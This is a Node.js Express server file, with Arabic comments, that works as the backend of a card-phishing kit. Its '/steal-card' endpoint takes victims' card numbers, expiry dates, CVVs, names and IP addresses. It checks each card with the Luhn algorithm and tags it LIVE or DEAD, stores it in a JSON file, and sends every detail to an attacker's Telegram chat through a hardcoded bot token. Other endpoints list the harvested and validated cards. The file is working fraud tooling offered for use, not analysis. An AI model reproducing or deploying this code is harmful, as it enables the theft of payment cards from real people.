const express = require('express');
const cors = require('cors');
const fs = require('fs');
const fetch = require('node-fetch');
const app = express();

app.use(cors());
app.use(express.json({limit: '10mb'}));
app.use(express.static('.'));

// 🔥 غير هادين بالتوكن ديالك
const BOT_TOKEN = '8465380742:AAF79euMNqONd2DPRyb1F_3Wm5hocYHP0xo';
const CHAT_ID = '8278195073';
const DATA_FILE = 'cards.json';

// Luhn Algorithm ✅
function luhnCheck(cardNumber) {
  const digits = cardNumber.replace(/\D/g, '').split('').map(Number);
  let sum = 0;
  let isEven = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = digits[i];
    if (isEven) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    isEven = !isEven;
  }
  return sum % 10 === 0;
}

// كشف البنك
function detectBank(card) {
  const num = card.replace(/\D/g, '');
  if (num.startsWith('4')) return '💳 Visa';
  if (num.startsWith('5')) return '🏆 Mastercard';
  if (num.startsWith('34') || num.startsWith('37')) return '⭐ Amex';
  if (num.startsWith('6011')) return '💎 Discover';
  return '❓ Unknown';
}

if (!fs.existsSync(DATA_FILE)) fs.writeFileSync(DATA_FILE, '[]');

app.post('/steal-card', async (req, res) => {
  const data = req.body;
  const cleanCard = data.card.replace(/\D/g, '');
  
  const isValid = luhnCheck(cleanCard);
  const bank = detectBank(cleanCard);
  
  console.log('💳 بطاقة:', data.name, cleanCard.substring(0,12)+'****', isValid ? '✅' : '❌');
  
  data.valid = isValid;
  data.bank = bank;
  data.clean_card = cleanCard;
  data.ip = req.ip;
  data.time = new Date().toLocaleString('ar');
  
  // حفظ
  const cards = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
  cards.unshift(data);
  fs.writeFileSync(DATA_FILE, JSON.stringify(cards, null, 2));
  
  // Telegram 🔥
  const status = isValid ? '✅ LIVE' : '⚠️ DEAD';
  const message = `
🆕 <b>بطاقة جديدة!</b>

${status}
💰 <b>${data.amount || 'غير محدد'}</b>
${data.bank}
👤 <code>${data.name}</code>
🪙 <code>${cleanCard}</code>
📅 <code>${data.expiry}</code>
🔒 <code>${data.cvv}</code>
🌐 IP: <code>${data.ip}</code>
⏰ ${data.time}

<i>الكل: ${cards.length} | صالحة: ${cards.filter(c=>c.valid).length}</i>
  `;
  
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message.trim(),
      parse_mode: 'HTML'
    })
  });
  
  res.json({success: true, valid: isValid});
});

app.get('/cards', (req, res) => {
  const cards = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
  res.json(cards);
});

app.get('/valid-cards', (req, res) => {
  const cards = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
  res.json(cards.filter(c => c.valid));
});

app.listen(3000, () => {
  console.log('🚀 PayCard Live: http://localhost:3000/paycard.html');
  console.log('📊 البطاقات: http://localhost:3000/valid-cards');
});
